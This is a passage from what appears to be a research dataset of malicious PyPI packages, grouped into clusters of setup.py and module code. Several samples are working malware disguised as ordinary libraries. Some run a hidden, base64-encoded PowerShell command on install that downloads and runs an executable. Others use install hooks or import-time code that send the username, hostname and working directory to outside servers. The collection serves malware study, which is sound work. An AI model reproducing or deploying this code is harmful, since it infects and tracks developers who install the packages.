)\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tprandompullpull-v8.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprandompullpull',\n    packages = ['modlib'],\n    version = '4.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tprandstringpep-v6.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprandstringpep',\n    packages = ['modlib'],\n    version = '3.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpsplitloadhydra-v10.39",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitloadhydra',\n    packages = ['modlib'],\n    version = '6.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpsplitpostpong-v1.95",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitpostpong',\n    packages = ['modlib'],\n    version = '3.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpsplitrandcv-v9.24",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitrandcv',\n    packages = ['modlib'],\n    version = '8.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstrpeplgtb-v2.63",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstrpepLGTB',\n    packages = ['modlib'],\n    version = '1.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 2,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-29-testpipxyz3-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport requests\n\n# Custom install command\nclass CustomInstallCommand(install):\n    def run(self):\n        # Run the whoami command\n        result = subprocess.run([\"whoami\"], capture_output=True, text=True)\n        username = result.stdout.strip()\n\n        # Send POST request to your server\n        url = \"https://vigneshsb.me/test.php\"\n        data = {\n            \"username\": username,\n            \"package name\": \"testpipxyz3\"\n        }\n\n        try:\n            response = requests.post(url, data=data)\n            response.raise_for_status()\n            print(\"POST request sent successfully.\")\n        except requests.exceptions.RequestException as e:\n            print(\"Failed to send POST request:\", str(e))\n\n        # Continue with the installation\n        install.run(self)\n\n# Setup function\nsetup(\n    name='testpipxyz3',\n    version='1.0.0',\n    author='Admin402',\n    description='This is to test Dependency Confution in my server.',\n    packages=['testpipxyz3'],\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\ndef add_numbers(a, b):\n    return a + b\n\ndef multiply_numbers(a, b):\n    return a * b\n\ndef greet(name):\n    return f\"Hello, {name}!\"\n\n\n\nfrom .module import add_numbers\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-29-testpipxyz4-v1.0.0",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport requests\n\n# Custom install command\nclass CustomInstallCommand(install):\n    def run(self):\n        # Run the whoami command\n        result = subprocess.run([\"whoami\"], capture_output=True, text=True)\n        username = result.stdout.strip()\n\n        # Send POST request to your server\n        url = \"https://vigneshsb.me/test.php\"\n        data = {\n            \"username\": username,\n            \"package name\": \"testpipxyz4\"\n        }\n\n        try:\n            response = requests.post(url, data=data)\n            response.raise_for_status()\n            print(\"POST request sent successfully.\")\n        except requests.exceptions.RequestException as e:\n            print(\"Failed to send POST request:\", str(e))\n\n        # Continue with the installation\n        install.run(self)\n\n# Setup function\nsetup(\n    name='testpipxyz4',\n    version='1.0.0',\n    author='Admin402',\n    description='This is to test Dependency Confution in my server.',\n    packages=['testpipxyz4'],\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n\n\ndef add_numbers(a, b):\n    return a + b\n\ndef multiply_numbers(a, b):\n    return a * b\n\ndef greet(name):\n    return f\"Hello, {name}!\"\n\n\n\nfrom .module import add_numbers\n"
      }
    ]
  },
  {
    "cluster_id": 3,
    "size": 35,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.3",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.15",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.16",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.17",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.18",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.19",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.2",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.20",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.6",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.7",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.8",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.10.2",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.10.3",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.10.4",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.2.4",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.2.5",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.2.6",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.2.7",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.2.8",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.0",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.1",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.10",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.2",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.4",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.5",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.6",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.7",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.8",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.3.9",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.10",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-06-bytedtrace-v0.1.11",
        "code": "import requests\nimport getpass\nimport socket,os\n\ntitle = \"bytedtrace\"\nversion = \"0.1.3\"\nrequests.post(\"https://0v0.in/pypi/\", json={\n            \"package_name\": title,\n            \"version\": version,\n            \"user\": getpass.getuser(),\n            \"cwd\": os.getcwd(),\n            \"hostname\": socket.gethostname()\n        })"
      },
      {
